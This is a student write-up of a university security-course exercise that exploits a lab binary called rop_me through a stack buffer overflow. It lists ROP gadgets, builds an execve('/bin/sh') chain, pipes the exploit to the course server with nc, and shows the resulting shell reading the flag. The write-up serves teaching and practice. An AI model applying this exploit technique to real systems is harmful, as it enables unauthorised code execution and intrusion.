# Answer

## ROP gadgets:
The following gadgets are generated using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). With the following command: ROPgadget --binary rop_me  
Note here that these cannot all be found by inspecting the disassembled binary,
since that lists each command with the relevant number of arguments. i.e.
40121a-40121e is disassembled as  
```
40121a:       b8 58 c3 00 00          mov    eax,0xc358
```
but 40121b-40121c can instead be used as:  
```
40121b:       58                      pop    rax
40121c:       c3                      ret
```
as is done by the ROPgadget program:
```
0x0000000000401452 : pop r15 ; ret
0x000000000040121b : pop rax ; ret
0x000000000040144b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040144f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040112d : pop rbp ; ret
0x00000000004013dc : pop rdi ; cmp rdi, rax ; jne 0x4013e6 ; mov rax, rsi ; ret
0x0000000000401453 : pop rdi ; ret
0x0000000000401451 : pop rsi ; pop r15 ; ret
0x000000000040144d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x000000000040101a : ret
0x0000000000401169 : ret 0x8b48
0x00000000004013af : ror byte ptr [rdi], 5 ; ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040120f : sbb eax, 0x90fffffe ; pop rbp ; ret
0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x00000000004011d2 : sub al, byte ptr [rax] ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040146d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040146c : sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004013a2 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x00000000004010b5 : test eax, eax ; je 0x4010c0 ; mov edi, 0x404048 ; jmp rax
0x00000000004010f7 : test eax, eax ; je 0x401108 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x00000000004013ae : xor eax, eax ; syscall
0x00000000004013c1 : xor edi, edi ; mov rdx, rdi ; inc rdi ; ret
0x00000000004013ab : xor edi, edi ; xor rax, rax ; syscall
0x00000000004013ad : xor rax, rax ; syscall
0x00000000004013c0 : xor rdi, rdi ; mov rdx, rdi ; inc rdi ; ret
0x00000000004013aa : xor rdi, rdi ; xor rax, rax ; syscall
```
This allows for a smarter exploit.


## ROP chain

A ROP chain build using the above addresses could be:  
``` python
rop_chain = [0x40121b,  # pop rax ; ret
             0x3b,      # data - syscall number of execve
             0x401453,  # pop rdi ; ret
             0x402012,  # data - "/bin/sh" pointer from rop_me
             0x401451,  # pop rsi ; pop r15 ; ret
             0x404080,  # data - NULL pointer from rop_me
             0x4013c1,  # xor edi, edi ; mov rdx, rdi ; inc rdi ; ret
             0x4013a2]  # syscall
```

## Implementation
The above ROP chain is put in the script rop_inject.py which smashes the buffer and injects the rop chain.  

In order to find the correct offset for the binary is decompiled, and inspected:  
```
00000000004012f9 <vuln>:
  4012f9:       55                      push   rbp
  4012fa:       48 89 e5                mov    rbp,rsp
  4012fd:       48 83 ec 30             sub    rsp,0x30
  401301:       48 8d 05 19 0f 00 00    lea    rax,[rip+0xf19]        # 402221 <_IO_stdin_used+0x221>
  401308:       48 89 c7                mov    rdi,rax
  40130b:       e8 20 fd ff ff          call   401030 <puts@plt>
  401310:       48 8d 45 d0             lea    rax,[rbp-0x30]
  401314:       be 80 0c 00 00          mov    esi,0xc80
  401319:       48 89 c7                mov    rdi,rax
  40131c:       e8 83 00 00 00          call   4013a4 <read_from_stdin>
  401321:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax
  401325:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]
  401329:       48 89 c6                mov    rsi,rax
  40132c:       48 8d 05 fd 0e 00 00    lea    rax,[rip+0xefd]        # 402230 <_IO_stdin_used+0x230>
  401333:       48 89 c7                mov    rdi,rax
  401336:       b8 00 00 00 00          mov    eax,0x0
  40133b:       e8 10 fd ff ff          call   401050 <printf@plt>
  401340:       90                      nop
  401341:       c9                      leave  
  401342:       c3                      ret    
```

looking at the vuln function, the stack pointer is offset by 0x30, and thus the
payload needs to start with 0x38 non zero bytes (overwriting the stack and 8
more bytes for RBP), and then the ROP chain.  
A python script is implemented which outputs the necessary number of bytes, and
then packs each of the addresses in the ROP chain.  

To perform the attack, the following command is then used:  
``` bash
(python rop_inject.py; cat) | nc rop.syssec.lnrd.net 1337
```

Which spawns a terminal. Executing a few commands, results in the following:  
``` console
felix@felix-laptop-20:~/courses/e21-syssec/au-syssec-e21-exercises/08_software_security_ii$ (python rop_inject.py; cat) | nc rop.syssec.lnrd.net 1337
to execute a program (e.g., a shell), you can use the execve syscall
- rax = 0x3b (syscall number)
- rdi = <pointer to the command> (e.g., "/bin/sh")
- rsi = <pointer to a NULL-terminated array of arguments> (e.g., pointer to a NULL pointer for no arguments)
- rdx = <pointer to a NULL-terminated array of environment variables> (e.g., pointer to a NULL pointer for no arguments)
useful values:
- string "/bin/sh" at address 0x402012
- pointer "(nil)" at address 0x404080
- readable/writable 1024 B array at address  0x4040a0
ROP me!
read 120 bytes from standard input


whoami
user
ls
flag.txt
rop_me
run.sh
cat flag.txt
flag{R0P_15_FuN}
```

revealing the flag to be: **flag{R0P_15_FuN}**
